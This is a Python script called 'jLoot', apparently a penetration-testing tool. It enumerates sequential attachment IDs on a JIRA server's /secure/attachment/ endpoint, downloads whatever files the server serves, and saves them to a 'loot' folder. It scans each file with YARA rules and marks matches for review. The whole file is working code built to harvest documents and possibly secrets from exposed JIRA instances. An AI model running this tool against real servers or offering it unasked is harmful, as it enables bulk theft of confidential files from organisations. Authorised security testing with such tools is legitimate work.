#!/usr/bin/env python3

import urllib.request
from socket import timeout
import argparse
import os
import yara

parser = argparse.ArgumentParser(description='jLoot - JIRA Secure Attachment Looter')
parser.add_argument('-u',action='store',dest='jURL', help="JIRA Base URL")
parser.add_argument('-s',action='store',dest='startf',type=int, help="Start File")
parser.add_argument('-t',action='store',dest='timeoutf',type=int, default=2, help="Request timeout amount. Default: 2")
parser.add_argument('-l',action='store',dest='flimit',type=int, help="File Limit")
parser.add_argument('-o',action='store',dest='outdir', help="Output Directory - Default 'loot/'")
parser.add_argument('-y',action='store',dest='yaraRules', help="Custom Yara Rules")
args = parser.parse_args()
timeoutf = args.timeoutf
startf = args.startf
flimit = args.flimit
jURL = args.jURL
attachURL = jURL + "/secure/attachment/"
if args.outdir:
    outdir = args.outdir + '/'
    if not os.path.exists(outdir):
        os.mkdir(outdir)
else:
    outdir = 'loot/'
if args.yaraRules:
    rules = yara.compile(args.yaraRules)
else:
    rules = yara.compile('jLoot.yar') # These are the stock yara rules.

# Matching callback
def yaraMatch(data):
  print(" | \u001b[41m"+data["rule"], end="\u001b[0m")
  return yara.CALLBACK_CONTINUE

i = 0
while i < flimit:
    fileNum = str(startf+i)
    try:
        url = attachURL+fileNum+'/'
        response = urllib.request.urlopen(url,timeout=timeoutf)
        fileName = response.headers.get_filename()
        data = response.read()
        if fileName != None:
            print("\u001b[32;1m[+]\u001b[0m {}: {}".format(fileNum,fileName),end="")
            matches = rules.match(data=data,callback=yaraMatch, which_callbacks=yara.CALLBACK_MATCHES,timeout=10)
            print()
            if matches:
                fileNum = "CHECK_"+fileNum
            with open(outdir+fileNum+'_'+fileName,'wb') as f:
                f.write(data)
                f.close()
        else:
            print("\u001b[31;1m[-]\u001b[0m {}: Not found".format(fileNum))
        i = i + 1
    except urllib.error.HTTPError:
        print("\u001b[31;1m[-]\u001b[0m {}: 404".format(fileNum))
        i = i+1
    except timeout:
        print("\u001b[31;1m[-]\u001b[0m Timeout...")
        i = i+1
        continue
